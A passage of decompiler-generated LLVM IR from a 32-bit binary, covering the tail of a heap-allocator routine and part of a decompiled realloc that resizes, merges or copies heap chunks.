  store i32 %v1_8052743, i32* %v3_8052749, align 4
  br label %dec_label_pc_80527b3

dec_label_pc_805274e:                             ; preds = %dec_label_pc_805218e
  %v5_8052754 = sub i32 %v1_8052171, %v1_805244e
  store i32 %v5_8052754, i32* %eax.global-to-local, align 4
  %v2_8052758 = add i32 %v0_805223c111, %v1_805244e
  store i32 %v2_8052758, i32* @edx, align 4
  %v1_805275c = or i32 %v1_805244e, 1
  store i32 %v2_8052758, i32* @global_var_80678d0.733, align 16
  store i32 %v1_805275c, i32* %v2_805216b, align 4
  %v0_8052768 = load i32, i32* %eax.global-to-local, align 4
  %v0_805276a = load i32, i32* @edx, align 4
  store i32 %v0_805276a, i32* @global_var_80678dc.750, align 4
  %v1_8052770 = or i32 %v0_8052768, 1
  store i32 %v1_8052770, i32* @ecx, align 4
  store i32 %v0_805276a, i32* @global_var_80678e0.735, align 32
  %v1_8052779 = add i32 %v0_805276a, 8
  %v2_8052779 = inttoptr i32 %v1_8052779 to i32*
  store i32 ptrtoint (i32* @global_var_80678d4.734 to i32), i32* %v2_8052779, align 4
  %v0_8052780 = load i32, i32* @edx, align 4
  %v1_8052780 = add i32 %v0_8052780, 12
  %v2_8052780 = inttoptr i32 %v1_8052780 to i32*
  store i32 ptrtoint (i32* @global_var_80678d4.734 to i32), i32* %v2_8052780, align 4
  %v0_8052787 = load i32, i32* @ecx, align 4
  %v1_8052787 = load i32, i32* @edx, align 4
  %v2_8052787 = add i32 %v1_8052787, 4
  %v3_8052787 = inttoptr i32 %v2_8052787 to i32*
  store i32 %v0_8052787, i32* %v3_8052787, align 4
  %v0_805278a = load i32, i32* %eax.global-to-local, align 4
  %v1_805278a = load i32, i32* @edx, align 4
  %v3_805278a = add i32 %v1_805278a, %v0_805278a
  %v4_805278a = inttoptr i32 %v3_805278a to i32*
  store i32 %v0_805278a, i32* %v4_805278a, align 4
  br label %dec_label_pc_8052798

dec_label_pc_805278f:                             ; preds = %dec_label_pc_805219d
  store i32 %v1_805244e, i32* %ebx.global-to-local, align 4
  %v0_8052793 = load i32, i32* @ebp, align 4
  %v2_8052793 = or i32 %v1_805244e, 4
  %v3_8052793 = add i32 %v0_8052793, %v2_8052793
  %v4_8052793 = inttoptr i32 %v3_8052793 to i32*
  %v5_8052793 = load i32, i32* %v4_8052793, align 4
  %v6_8052793 = or i32 %v5_8052793, 1
  store i32 %v6_8052793, i32* %v4_8052793, align 4
  br label %dec_label_pc_8052798

dec_label_pc_8052798:                             ; preds = %dec_label_pc_805274e, %dec_label_pc_805278f
  %v0_8052798 = load i32, i32* @ebp, align 4
  %v1_8052798 = add i32 %v0_8052798, 8
  store i32 %v1_8052798, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80527b3

dec_label_pc_805279d:                             ; preds = %dec_label_pc_805228d
  %v1_805279d = load i32, i32* @ebx, align 4
  %v2_805279d = add i32 %v0_805229c, 4
  %v3_805279d = add i32 %v2_805279d, %v1_805279d
  %v4_805279d = inttoptr i32 %v3_805279d to i32*
  %v5_805279d = load i32, i32* %v4_805279d, align 4
  %v6_805279d = or i32 %v5_805279d, 1
  store i32 %v6_805279d, i32* %v4_805279d, align 4
  br label %dec_label_pc_80527a2

dec_label_pc_80527a2:                             ; preds = %dec_label_pc_80522a5, %dec_label_pc_805279d
  %v0_80527a2 = load i32, i32* @ecx, align 4
  store i32 %v0_80527a2, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80527b3

dec_label_pc_80527a6:                             ; preds = %dec_label_pc_8052564, %dec_label_pc_805271a, %dec_label_pc_805256e
  %v0_80527a6 = load i32, i32* %stack_var_-92, align 4
  %v1_80527a6 = call i32 @__errno_location(i32 %v0_80527a6)
  store i32 %v1_80527a6, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_80527ad = inttoptr i32 %v1_80527a6 to i32*
  store i32 12, i32* %v1_80527ad, align 4
  br label %dec_label_pc_80527b3

dec_label_pc_80527b3:                             ; preds = %dec_label_pc_80527a2, %dec_label_pc_8052798, %dec_label_pc_8052743, %dec_label_pc_80523ff, %dec_label_pc_80523b1, %dec_label_pc_8052138, %dec_label_pc_80527a6
  store i32 %v2_805206f, i32* @eax, align 4
  store i32 %v2_805206f, i32* %stack_var_-92, align 4
  %v2_80527bc = call i32 @__pthread_return_void(i32 %v2_805206f, i32 1)
  store i32 %v2_80527bc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80527c4

dec_label_pc_80527c4:                             ; preds = %dec_label_pc_805208d, %dec_label_pc_80527b3
  %v0_80527c7 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80527c7, i32* %eax.global-to-local, align 4
  %v2_80527c9 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80527c9, i32* @ebx, align 4
  store i32 %v0_805205c, i32* @esi, align 4
  store i32 %v0_805205b, i32* @edi, align 4
  store i32 %v0_805205a, i32* @ebp, align 4
  ret i32 %v0_80527c7

; uselistorder directives
  uselistorder i32 %v0_805278a, { 1, 0 }
  uselistorder i32 %v0_805276a, { 1, 0, 2 }
  uselistorder i32 %v2_8052707, { 1, 0, 2 }
  uselistorder i32 %v0_80526f5, { 0, 2, 1, 3 }
  uselistorder i32 %v0_805268c, { 1, 0 }
  uselistorder i32 %v2_805267a, { 1, 0 }
  uselistorder i32 %v1_8052631, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_805261b, { 1, 0, 2 }
  uselistorder i32 %v2_805260f, { 1, 2, 0 }
  uselistorder i32 %v2_805260a, { 1, 0, 2 }
  uselistorder i32 %v1_80525fa, { 2, 1, 0 }
  uselistorder i8 %v0_80525c8, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_80525ab, { 1, 0, 2 }
  uselistorder i32 %v0_805265f91, { 2, 0, 1 }
  uselistorder i32 %v0_805266d92, { 3, 4, 1, 2, 5, 0, 7, 6 }
  uselistorder i32 %v1_80525a5, { 2, 1, 0 }
  uselistorder i32 %v8_805257b, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8052578, { 1, 0 }
  uselistorder i32 %v0_8052557, { 1, 0 }
  uselistorder i32 %v2_8052528, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8052520, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_805250d, { 1, 0 }
  uselistorder i32 %v1_8052504, { 5, 0, 1, 2, 3, 4, 6, 7 }
  uselistorder i32 %v0_80524f1, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_80524d5, { 1, 0, 2 }
  uselistorder i32 %v2_80524c1, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_805248a, { 1, 2, 0, 3 }
  uselistorder i32 %v1_805247e, { 2, 1, 0 }
  uselistorder i32 %v8_805246d, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 %v2_8052454, { 1, 0, 2 }
  uselistorder i32 %v0_80523f0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_80523c3, { 2, 0, 1, 3 }
  uselistorder i32 %v0_80523b9, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_80523ab, { 1, 0 }
  uselistorder i32 %v1_8052342, { 1, 0 }
  uselistorder i32 %v3_8052336, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_8052346, { 1, 0 }
  uselistorder i32 %v2_8052330, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_805232d12, { 1, 0 }
  uselistorder i32 %v2_8052322, { 1, 0 }
  uselistorder i32 %v1_8052306, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_8052302, { 2, 1, 0 }
  uselistorder i32 %v1_80522fe, { 1, 0 }
  uselistorder i32 %v1_80522f2, { 2, 1, 0 }
  uselistorder i32 %v2_80522e8, { 1, 0 }
  uselistorder i32 %v1_80522e5, { 1, 2, 0 }
  uselistorder i32 %v4_8052283, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_80522ce, { 1, 0 }
  uselistorder i32 %v0_805229c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_805226f, { 2, 0, 1, 3 }
  uselistorder i32 %v0_805223c, { 1, 2, 0 }
  uselistorder i32 %v2_8052220, { 1, 0 }
  uselistorder i32 %v1_8052216, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_8052211.lcssa, { 1, 0 }
  uselistorder i32 %v3_8052201, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_80521f8, { 1, 0, 2 }
  uselistorder i32 %v2_80521d4, { 2, 0, 1, 3 }
  uselistorder i32 %v2_80521bc, { 2, 1, 0 }
  uselistorder i32 %v0_80521a8, { 2, 0, 3, 1 }
  uselistorder i32 %v3_805216e, { 1, 0, 2 }
  uselistorder i32 %v0_805223c111, { 0, 3, 1, 2 }
  uselistorder i32 %v3_805211b, { 1, 0, 2 }
  uselistorder i32 %v2_805210d, { 2, 1, 0 }
  uselistorder i32 %v2_80520e8, { 2, 1, 0 }
  uselistorder i8 %v0_80520b6, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_805244e, { 13, 31, 11, 2, 29, 12, 3, 22, 21, 10, 9, 4, 24, 23, 20, 18, 19, 5, 25, 26, 6, 27, 28, 15, 7, 16, 17, 8, 30, 14, 0, 32, 34, 33, 1, 35 }
  uselistorder i32 %v1_805209f, { 0, 2, 1 }
  uselistorder i32 %v0_8052088, { 1, 0 }
  uselistorder i32 %v2_805206f, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %ebx.global-to-local, { 21, 2, 3, 4, 5, 6, 7, 8, 9, 13, 10, 0, 11, 12, 14, 15, 16, 17, 1, 18, 19, 20, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 55, 50, 51, 54, 53, 52, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_8067c00.747, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 134641876, { 2, 3, 1, 0 }
  uselistorder i32* @global_var_80678e0.735, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__malloc_largebin_index, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_80678cc.732 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_80678cc.732 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_80527c4, { 1, 0 }
  uselistorder label %dec_label_pc_80527b3, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_80527a6, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80527a2, { 1, 0 }
  uselistorder label %dec_label_pc_8052798, { 1, 0 }
  uselistorder label %dec_label_pc_8052743, { 1, 0 }
  uselistorder label %dec_label_pc_805271a, { 1, 0 }
  uselistorder label %dec_label_pc_8052707, { 1, 0 }
  uselistorder label %dec_label_pc_80526f5, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8052687, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052682, { 1, 0 }
  uselistorder label %dec_label_pc_8052666, { 1, 0 }
  uselistorder label %dec_label_pc_805260f, { 1, 0 }
  uselistorder label %dec_label_pc_80525f8, { 1, 0 }
  uselistorder label %dec_label_pc_80525e1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8052564, { 1, 0 }
  uselistorder label %dec_label_pc_8052557, { 1, 0 }
  uselistorder label %dec_label_pc_8052518, { 1, 0 }
  uselistorder label %dec_label_pc_80524f1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80524d5, { 1, 0 }
  uselistorder label %dec_label_pc_80524bc, { 1, 0 }
  uselistorder label %dec_label_pc_805249e, { 1, 0 }
  uselistorder label %dec_label_pc_80523b9, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80523b1, { 1, 0 }
  uselistorder label %dec_label_pc_805239a, { 1, 0 }
  uselistorder label %dec_label_pc_805232d, { 1, 0 }
  uselistorder label %dec_label_pc_8052332.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8052306, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805228d, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %dec_label_pc_8052214, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_80521fd, { 1, 0 }
  uselistorder label %dec_label_pc_805216b, { 1, 0 }
  uselistorder label %dec_label_pc_805223c.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052138, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_80520b6, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_80527d2 = load i32, i32* @esi, align 4
  %v0_80527d3 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_80527db = icmp eq i32* %arg1, null
  %v1_80527e0 = icmp eq i1 %v4_80527db, false
  br i1 %v1_80527e0, label %dec_label_pc_80527f2, label %dec_label_pc_80527e2

dec_label_pc_80527e2:                             ; preds = %entry
  store i32 %arg2, i32* %stack_var_-60, align 4
  %v1_80527e6 = call i32 @malloc(i32 %arg2)
  store i32 %v1_80527e6, i32* %eax.global-to-local, align 4
  store i32 %v1_80527e6, i32* @ebx, align 4
  br label %dec_label_pc_8052aeb

dec_label_pc_80527f2:                             ; preds = %entry
  %v1_80527f2 = icmp eq i32 %arg2, 0
  %v1_80527f4 = icmp eq i1 %v1_80527f2, false
  br i1 %v1_80527f4, label %dec_label_pc_8052807, label %dec_label_pc_80527f6

dec_label_pc_80527f6:                             ; preds = %dec_label_pc_80527f2
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_80527fd = call i32 @free(i32 %tmp7)
  store i32 %v1_80527fd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052aeb

dec_label_pc_8052807:                             ; preds = %dec_label_pc_80527f2
  %v2_8052812 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8052812, i32* @eax, align 4
  store i32 %v2_8052812, i32* %stack_var_-60, align 4
  %v2_8052817 = call i32 @__pthread_return_void(i32 %v2_8052812, i32 134560279)
  store i32 %v2_8052817, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8061430.730 to i32), i32* %stack_var_-60, align 4
  %v1_8052823 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8061430.730 to i32))
  store i32 %v1_8052823, i32* %eax.global-to-local, align 4
  %v0_805282b = load i32, i32* @ebx, align 4
  %tmp20 = icmp ult i32 %v0_805282b, -32
  br i1 %tmp20, label %dec_label_pc_8052842, label %dec_label_pc_8052830

dec_label_pc_8052830:                             ; preds = %dec_label_pc_8052807
  %v0_8052830 = load i32, i32* %stack_var_-60, align 4
  %v1_8052830 = call i32 @__errno_location(i32 %v0_8052830)
  store i32 %v1_8052830, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8052837 = inttoptr i32 %v1_8052830 to i32*
  store i32 12, i32* %v1_8052837, align 4
  br label %dec_label_pc_8052aee

dec_label_pc_8052842:                             ; preds = %dec_label_pc_8052807
  %v1_8052842 = add i32 %v0_805282b, 11
  %tmp21 = icmp ult i32 %v1_8052842, 16
  br i1 %tmp21, label %dec_label_pc_8052859, label %dec_label_pc_8052852

dec_label_pc_8052852:                             ; preds = %dec_label_pc_8052842
  %v1_8052852 = and i32 %v1_8052842, -8
  br label %dec_label_pc_8052859

dec_label_pc_8052859:                             ; preds = %dec_label_pc_8052842, %dec_label_pc_8052852
  %stack_var_-40.0 = phi i32 [ %v1_8052852, %dec_label_pc_8052852 ], [ 16, %dec_label_pc_8052842 ]
  %storemerge27 = phi i32 [ %v1_8052852, %dec_label_pc_8052852 ], [ %v1_8052842, %dec_label_pc_8052842 ]
  store i32 %storemerge27, i32* %eax.global-to-local, align 4
  %v1_805285d = add i32 %tmp7, -8
  store i32 %v1_805285d, i32* @edi, align 4
  %v1_8052860 = add i32 %tmp7, -4
  %v2_8052860 = inttoptr i32 %v1_8052860 to i32*
  %v3_8052860 = load i32, i32* %v2_8052860, align 4
  store i32 %v3_8052860, i32* @edx, align 4
  %v1_8052865 = and i32 %v3_8052860, -4
  store i32 %v1_8052865, i32* %eax.global-to-local, align 4
  %v2_805286c = and i32 %v3_8052860, 2
  %v3_805286c = icmp eq i32 %v2_805286c, 0
  %v1_805286f = icmp eq i1 %v3_805286c, false
  br i1 %v1_805286f, label %dec_label_pc_8052a09, label %dec_label_pc_8052875

dec_label_pc_8052875:                             ; preds = %dec_label_pc_8052859
  store i32 %stack_var_-40.0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8052865, i32* @ebx, align 4
  %v7_805287b = icmp ult i32 %v1_8052865, %stack_var_-40.0
  %v1_805287d = icmp eq i1 %v7_805287b, false
  br i1 %v1_805287d, label %dec_label_pc_80529b4, label %dec_label_pc_8052883

dec_label_pc_8052883:                             ; preds = %dec_label_pc_8052875
  %v2_8052883 = add i32 %v1_8052865, %v1_805285d
  store i32 %v2_8052883, i32* @esi, align 4
  %v1_8052886 = load i32, i32* @global_var_80678cc.732, align 4
  %v12_8052886 = icmp eq i32 %v2_8052883, %v1_8052886
  %v1_805288c = icmp eq i1 %v12_8052886, false
  %v1_80528c6 = add i32 %v2_8052883, 4
  %v2_80528c6 = inttoptr i32 %v1_80528c6 to i32*
  %v3_80528c6 = load i32, i32* %v2_80528c6, align 4
  br i1 %v1_805288c, label %dec_label_pc_80528c6, label %dec_label_pc_805288e

dec_label_pc_805288e:                             ; preds = %dec_label_pc_8052883
  %v1_8052893 = and i32 %v3_80528c6, -4
  %v2_8052896 = add i32 %v1_8052893, %v1_8052865
  store i32 %v2_8052896, i32* %ecx.global-to-local, align 4
  %v1_805289c = add i32 %stack_var_-40.0, 16
  store i32 %v1_805289c, i32* %eax.global-to-local, align 4
  %v7_805289f = icmp ult i32 %v2_8052896, %v1_805289c
  br i1 %v7_805289f, label %dec_label_pc_8052904, label %dec_label_pc_80528a3

dec_label_pc_80528a3:                             ; preds = %dec_label_pc_805288e
  %v1_80528a3 = urem i32 %v3_8052860, 2
  %v5_80528a6 = or i32 %v1_80528a3, %stack_var_-40.0
  store i32 %v5_80528a6, i32* @edx, align 4
  store i32 %v5_80528a6, i32* %v2_8052860, align 4
  %v0_80528b1 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80528b1 = sub i32 %v0_80528b1, %stack_var_-40.0
  %v0_80528b3 = load i32, i32* @edi, align 4
  %v2_80528b3 = add i32 %v0_80528b3, %stack_var_-40.0
  store i32 %v2_80528b3, i32* %eax.global-to-local, align 4
  %v1_80528b6 = or i32 %v2_80528b1, 1
  store i32 %v1_80528b6, i32* %ecx.global-to-local, align 4
  store i32 %v2_80528b3, i32* @global_var_80678cc.732, align 4
  %v2_80528be = add i32 %v2_80528b3, 4
  %v3_80528be = inttoptr i32 %v2_80528be to i32*
  store i32 %v1_80528b6, i32* %v3_80528be, align 4
  br label %dec_label_pc_8052ad9

dec_label_pc_80528c6:                             ; preds = %dec_label_pc_8052883
  %v1_80528cb = and i32 %v3_80528c6, -2
  store i32 %v1_80528cb, i32* %eax.global-to-local, align 4
  %v3_80528ce = add i32 %v1_80528c6, %v1_80528cb
  %v4_80528ce = inttoptr i32 %v3_80528ce to i8*
  %v5_80528ce = load i8, i8* %v4_80528ce, align 1
  %v6_80528ce = urem i8 %v5_80528ce, 2
  %v7_80528ce = icmp eq i8 %v6_80528ce, 0
  %v1_80528d3 = icmp eq i1 %v7_80528ce, false
  br i1 %v1_80528d3, label %dec_label_pc_8052904, label %dec_label_pc_80528d5

dec_label_pc_80528d5:                             ; preds = %dec_label_pc_80528c6
  %v1_80528d5 = and i32 %v3_80528c6, -4
  %v2_80528dc = add i32 %v1_80528d5, %v1_8052865
  store i32 %v2_80528dc, i32* @ebx, align 4
  %v10_80528de = icmp ult i32 %v2_80528dc, %stack_var_-40.0
  br i1 %v10_80528de, label %dec_label_pc_8052904, label %dec_label_pc_80528e4

dec_label_pc_80528e4:                             ; preds = %dec_label_pc_80528d5
  %v1_80528e4 = add i32 %v1_8052865, %tmp7
  %v2_80528e4 = inttoptr i32 %v1_80528e4 to i32*
  %v3_80528e4 = load i32, i32* %v2_80528e4, align 4
  store i32 %v3_80528e4, i32* @edx, align 4
  %v1_80528e7 = add i32 %v2_8052883, 12
  %v2_80528e7 = inttoptr i32 %v1_80528e7 to i32*
  %v3_80528e7 = load i32, i32* %v2_80528e7, align 4
  store i32 %v3_80528e7, i32* %eax.global-to-local, align 4
  %v1_80528ea = add i32 %v3_80528e4, 12
  %v2_80528ea = inttoptr i32 %v1_80528ea to i32*
  %v3_80528ea = load i32, i32* %v2_80528ea, align 4
  %v15_80528ea = icmp eq i32 %v3_80528ea, %v2_8052883
  %v1_80528ed = icmp eq i1 %v15_80528ea, false
  br i1 %v1_80528ed, label %dec_label_pc_80528f4, label %dec_label_pc_80528ef

dec_label_pc_80528ef:                             ; preds = %dec_label_pc_80528e4
  %v1_80528ef = add i32 %v3_80528e7, 8
  %v2_80528ef = inttoptr i32 %v1_80528ef to i32*
  %v3_80528ef = load i32, i32* %v2_80528ef, align 4
  %v15_80528ef = icmp eq i32 %v3_80528ef, %v2_8052883
  br i1 %v15_80528ef, label %dec_label_pc_80528f9, label %dec_label_pc_80528f4

dec_label_pc_80528f4:                             ; preds = %dec_label_pc_80528ef, %dec_label_pc_80528e4
  %v0_80528f4 = call i32 @abort()
  store i32 %v0_80528f4, i32* %eax.global-to-local, align 4
  %v1_80528f9.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80528f9

dec_label_pc_80528f9:                             ; preds = %dec_label_pc_80528ef, %dec_label_pc_80528f4
  %v1_80528f9 = phi i32 [ %v3_80528e4, %dec_label_pc_80528ef ], [ %v1_80528f9.pre, %dec_label_pc_80528f4 ]
  %v0_80528f9 = phi i32 [ %v3_80528e7, %dec_label_pc_80528ef ], [ %v0_80528f4, %dec_label_pc_80528f4 ]
  %v2_80528f9 = add i32 %v1_80528f9, 12
  %v3_80528f9 = inttoptr i32 %v2_80528f9 to i32*
  store i32 %v0_80528f9, i32* %v3_80528f9, align 4
  %v0_80528fc = load i32, i32* @edx, align 4
  %v1_80528fc = load i32, i32* %eax.global-to-local, align 4
  %v2_80528fc = add i32 %v1_80528fc, 8
  %v3_80528fc = inttoptr i32 %v2_80528fc to i32*
  store i32 %v0_80528fc, i32* %v3_80528fc, align 4
  %v0_80529b4.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80529b4

dec_label_pc_8052904:                             ; preds = %dec_label_pc_80528d5, %dec_label_pc_80528c6, %dec_label_pc_805288e
  %v1_805290b = add i32 %stack_var_-40.0, -7
  store i32 %v1_805290b, i32* %eax.global-to-local, align 4
  store i32 %v1_805290b, i32* %stack_var_-60, align 4
  %v1_805290f = call i32 @malloc(i32 %v1_805290b)
  store i32 %v1_805290f, i32* %eax.global-to-local, align 4
  store i32 %v1_805290f, i32* @edx, align 4
  %v1_8052919 = icmp eq i32 %v1_805290f, 0
  br i1 %v1_8052919, label %dec_label_pc_8052ad5, label %dec_label_pc_8052921

dec_label_pc_8052921:                             ; preds = %dec_label_pc_8052904
  %v1_8052921 = add i32 %v1_805290f, -8
  store i32 %v1_8052921, i32* %ebx.global-to-local, align 4
  %v1_8052924 = load i32, i32* @esi, align 4
  %v12_8052924 = icmp eq i32 %v1_8052921, %v1_8052924
  %v1_8052926 = add i32 %v1_805290f, -4
  %v2_8052926 = inttoptr i32 %v1_8052926 to i32*
  %v3_8052926 = load i32, i32* %v2_8052926, align 4
  store i32 %v3_8052926, i32* %eax.global-to-local, align 4
  %v1_8052929 = icmp eq i1 %v12_8052924, false
  br i1 %v1_8052929, label %dec_label_pc_8052937, label %dec_label_pc_805292b

dec_label_pc_805292b:                             ; preds = %dec_label_pc_8052921
  %v1_805292b = and i32 %v3_8052926, -4
  store i32 %v1_805292b, i32* %eax.global-to-local, align 4
  store i32 %v1_8052865, i32* @edx, align 4
  %v2_8052932 = add i32 %v1_805292b, %v1_8052865
  store i32 %v2_8052932, i32* @ebx, align 4
  br label %dec_label_pc_80529b4

dec_label_pc_8052937:                             ; preds = %dec_label_pc_8052921
  %v1_805293b = add i32 %v1_8052865, -4
  store i32 %v1_805293b, i32* %eax.global-to-local, align 4
  %v2_8052940 = udiv i32 %v1_805293b, 4
  store i32 %v2_8052940, i32* %ecx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805293b, 37
  br i1 %tmp, label %dec_label_pc_8052959, label %dec_label_pc_8052948

dec_label_pc_8052948:                             ; preds = %dec_label_pc_8052937
  store i32 %v1_805290f, i32* %stack_var_-60, align 4
  %v3_805294f = inttoptr i32 %v1_805290f to i16*
  %v4_805294f = call i32 @memcpy(i16* %v3_805294f, i32 %tmp7, i32 %v1_805293b)
  store i32 %v4_805294f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80529a0

dec_label_pc_8052959:                             ; preds = %dec_label_pc_8052937
  store i32 %tmp7, i32* @esi, align 4
  %v2_8052960 = load i32, i32* %arg1, align 4
  store i32 %v2_8052960, i32* %eax.global-to-local, align 4
  %v2_8052962 = inttoptr i32 %v1_805290f to i32*
  store i32 %v2_8052960, i32* %v2_8052962, align 4
  %v0_8052964 = load i32, i32* @esi, align 4
  %v1_8052964 = add i32 %v0_8052964, 4
  %v2_8052964 = inttoptr i32 %v1_8052964 to i32*
  %v3_8052964 = load i32, i32* %v2_8052964, align 4
  store i32 %v3_8052964, i32* %eax.global-to-local, align 4
  %v1_8052967 = load i32, i32* @edx, align 4
  %v2_8052967 = add i32 %v1_8052967, 4
  %v3_8052967 = inttoptr i32 %v2_8052967 to i32*
  store i32 %v3_8052964, i32* %v3_8052967, align 4
  %v0_805296a = load i32, i32* @esi, align 4
  %v1_805296a = add i32 %v0_805296a, 8
  %v2_805296a = inttoptr i32 %v1_805296a to i32*
  %v3_805296a = load i32, i32* %v2_805296a, align 4
  store i32 %v3_805296a, i32* %eax.global-to-local, align 4
  %v1_805296d = load i32, i32* @edx, align 4
  %v2_805296d = add i32 %v1_805296d, 8
  %v3_805296d = inttoptr i32 %v2_805296d to i32*
  store i32 %v3_805296a, i32* %v3_805296d, align 4
  %tmp28 = icmp ult i32 %v1_805293b, 17
  br i1 %tmp28, label %dec_label_pc_80529a0, label %dec_label_pc_8052972

dec_label_pc_8052972:                             ; preds = %dec_label_pc_8052959
  %v0_8052972 = load i32, i32* @esi, align 4
  %v1_8052972 = add i32 %v0_8052972, 12
  %v2_8052972 = inttoptr i32 %v1_8052972 to i32*
  %v3_8052972 = load i32, i32* %v2_8052972, align 4
  store i32 %v3_8052972, i32* %eax.global-to-local, align 4
  %v0_8052975 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052978 = load i32, i32* @edx, align 4
  %v2_8052978 = add i32 %v1_8052978, 12
  %v3_8052978 = inttoptr i32 %v2_8052978 to i32*
  store i32 %v3_8052972, i32* %v3_8052978, align 4
  %v0_805297b = load i32, i32* @esi, align 4
  %v1_805297b = add i32 %v0_805297b, 16
  %v2_805297b = inttoptr i32 %v1_805297b to i32*
  %v3_805297b = load i32, i32* %v2_805297b, align 4
  store i32 %v3_805297b, i32* %eax.global-to-local, align 4
  %v1_805297e = load i32, i32* @edx, align 4
  %v2_805297e = add i32 %v1_805297e, 16
  %v3_805297e = inttoptr i32 %v2_805297e to i32*
  store i32 %v3_805297b, i32* %v3_805297e, align 4
  %tmp22 = icmp ult i32 %v0_8052975, 7
  br i1 %tmp22, label %dec_label_pc_80529a0, label %dec_label_pc_8052983

dec_label_pc_8052983:                             ; preds = %dec_label_pc_8052972
  %v0_8052983 = load i32, i32* @esi, align 4
  %v1_8052983 = add i32 %v0_8052983, 20
  %v2_8052983 = inttoptr i32 %v1_8052983 to i32*
  %v3_8052983 = load i32, i32* %v2_8052983, align 4
  store i32 %v3_8052983, i32* %eax.global-to-local, align 4
  %v0_8052986 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052989 = load i32, i32* @edx, align 4
  %v2_8052989 = add i32 %v1_8052989, 20
  %v3_8052989 = inttoptr i32 %v2_8052989 to i32*
  store i32 %v3_8052983, i32* %v3_8052989, align 4
  %v0_805298c = load i32, i32* @esi, align 4
  %v1_805298c = add i32 %v0_805298c, 24
  %v2_805298c = inttoptr i32 %v1_805298c to i32*
  %v3_805298c = load i32, i32* %v2_805298c, align 4
  store i32 %v3_805298c, i32* %eax.global-to-local, align 4
  %v1_805298f = load i32, i32* @edx, align 4
  %v2_805298f = add i32 %v1_805298f, 24
